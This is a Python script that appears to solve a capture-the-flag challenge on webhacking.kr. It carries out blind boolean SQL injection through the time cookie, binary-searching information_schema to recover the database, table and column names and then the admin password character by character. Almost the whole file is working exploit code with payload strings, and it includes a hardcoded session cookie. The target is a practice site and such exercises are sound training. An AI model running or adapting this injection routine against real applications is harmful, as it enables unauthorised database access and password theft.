#!/usr/bin/env python 


import urllib 
import urllib.request

url = "https://webhacking.kr/challenge/web-02/" 
cookie = "PHPSESSID=j1gqc4lopk8ge3331ehiq9shhf; time=1571026965 " 

ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
truePhrase = b"2070-01-01 09:00:01" 

def query(payload): 
	ccookie = cookie + urllib.request.quote(payload) 
	req = urllib.request.Request(url) 
	req.add_header('cookie', ccookie) 
	req.add_header("User-Agent", ua) 
	res = urllib.request.urlopen(req) 
	content = res.read() 
	# print( ccookie )
	# print( str(content ))
	return truePhrase in content 

def find_db_name_len(db_index): 
	left = 0 
	right = 200 

	# range (left, right] 
	while left + 1 < right: 
		mid = (left+right)//2 
		print ("{}, {}, {}".format(left, mid, right) )
		payload = "and if((select length(table_schema) from information_schema.tables group by table_schema limit {},1) > {}, 1, 0)".format(db_index, mid) 
		if query(payload): 
			left = mid 
		else: 
			right = mid 

	return right 

def find_db_name(db_index): 
	if db_index == 1: 
		return "chall2" 
	# db_name_len = find_db_name_len(db_index) 
	db_name_len = 6 
	db_name = "" 
	for pos in range(1, db_name_len+1): 
		left = 0 
		right = 200 
		while left + 1 < right: 
			mid = (left+right)//2 
			print ("{}, {}, {}".format(left, mid, right) )
			payload = "and if((select ascii(substr(table_schema,{},1)) from information_schema.tables group by table_schema limit {},1)>{},1,0)".format(pos, db_index, mid) 
			if query(payload): 
				left = mid 
			else: 
				right = mid 

		db_name += chr(right) 
	return db_name 

# print( find_db_name(0) )

def find_table_name_length(db_name, table_index): 
	left = 0 
	right = 200
	while left + 1 < right: 
		mid = (left+right)//2 
		payload = "and if((select length(table_name) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)".format(db_name, table_index, mid) 
		if query(payload): 
			left = mid 
		else: 
			right = mid 

	return right 

# print( find_table_name_length('chall2', 0) )
# print( find_table_name_length('chall2', 1) )

def find_table_name(db_name, table_index): 
	table_name_len = find_table_name_length(db_name, table_index) 
	table_name = "" 
	for pos in range(1, table_name_len + 1): 
		left = 0 
		right = 200 
		while left + 1 < right: 
			mid = (left+right)//2 
			payload = "and if((select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='{}' group by table_name limit {},1)>{},1,0)".format(pos, db_name, table_index, mid) 
			if query(payload): 
				left = mid 
			else: 
				right = mid 
		table_name += chr(right) 
	return table_name 

# print (find_table_name('chall2', 0) )
# print (find_table_name('chall2', 1) )

def find_column_name(db_name, table_name): 
	col_name = "" 
	for pos in range(1, 3): 
		left = 0 
		right = 200 
		while left + 1 < right: 
			mid = (left+right)//2 
			payload = "and if((select ascii(substr(column_name,{},1)) from information_schema.columns where table_schema='{}' and table_name='{}' group by column_name limit 0,1)>{},1,0)".format(pos, db_name, table_name, mid) 
			if query(payload): 
				left = mid 
			else: 
				right = mid 
		col_name += chr(right) 
	return col_name 

def find_pw(): 
	pw = "" 
	for pos in range(1, 18): 
		left = 0 
		right =200 
		while left + 1 < right: 
			mid = (left+right)//2 
			payload = "and if((select ascii(substr(pw,{},1)) from chall2.admin_area_pw limit 1, 1)>{},1,0)".format(pos,mid) 
			if query(payload): 
				left = mid 
			else: 
				right = mid 
		pw += chr(right) 
		print (chr(right) )
	return pw 

# print find_column_name("chall2", "admin_area_pw") 
print (find_pw())
